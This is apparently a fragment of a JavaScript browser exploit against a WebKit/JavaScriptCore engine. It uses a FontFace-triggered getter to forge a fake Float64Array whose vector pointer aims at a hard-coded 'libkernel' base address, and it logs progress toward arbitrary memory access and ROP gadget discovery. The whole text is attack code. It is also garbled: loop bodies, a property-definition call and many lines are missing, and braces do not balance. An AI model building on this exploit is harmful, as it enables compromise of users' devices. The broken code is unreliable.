<script>
"use strict";

let logBuf = [];

function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.innerHTML = logBuf.map(line => {
            let className = '';
            if (line.includes('[+++]')) className = 'success';
            else if (line.includes('[ERROR]')) className = 'error';
            else if (line.includes('[!]')) className = 'warning';
            else if (line.includes('[+]')) className = 'info';
            else if (line.includes('0x7F')) className = 'highlight';
            
            return `<span class="${className}">${line}</span>`;
        }).join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

function hex64(low, high) {
    if (low < 0) low = low >>> 0;
    if (high < 0) high = high >>> 0;
    return '0x' + high.toString(16).padStart(8, '0') + '_' + low.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return new Float64Array(buf)[0];
    }
    
    toString() {
        return hex64(this.low, this.high);
    }
}

// libkernel base address from dump
const LIBKERNEL_BASE = new Int64(0x75C00000, 0x7F8B49F3);

    log('═══════════════════════════════════════════════════════');

    // Setup
    let style = document.createElement('style');

    // Create arrays BEFORE corruption

    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {

    log('[SETUP] Arrays created and pre-filled\n');
    
    // Create controlled buffer for fake object
    let fakeObjBuffer = new ArrayBuffer(0x1000);
    let fakeU32 = new Uint32Array(fakeObjBuffer);
    let fakeF64 = new Float64Array(fakeObjBuffer);

    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });

        configurable: true,
        get() {

                // JSC Float64Array structure (approximate):
                // +0x00: JSCell header (m_structureID, m_indexingType, m_type, m_flags, m_cellState)
                // +0x08: Butterfly pointer (can be 0 for TypedArrays)
                // +0x10: Vector pointer (THIS IS WHAT WE CONTROL - points to data)
                // +0x18: Length (as Int64)
                // +0x20: Mode/Flags
                
                // JSCell header - approximate values for Float64Array
                fakeU32[fakeIdx + 0] = 0x0108; // m_structureID (guess)
                fakeU32[fakeIdx + 1] = 0x00182700; // m_indexingType/type/flags
                
                // Butterfly (null for TypedArrays)

                fakeU32[fakeIdx + 3] = 0x0;

                log('[+] Vector pointer set to: ' + LIBKERNEL_BASE.toString());

                                log('');
                                log('[+++] IF YOU SEE DATA ABOVE: SUCCESS!');

                                log('[+++] Can now find ROP gadgets!');
                                
                            } catch(e) {

                        } else {

                    } else {

                log('\n[!] Returning - OOM will occur');
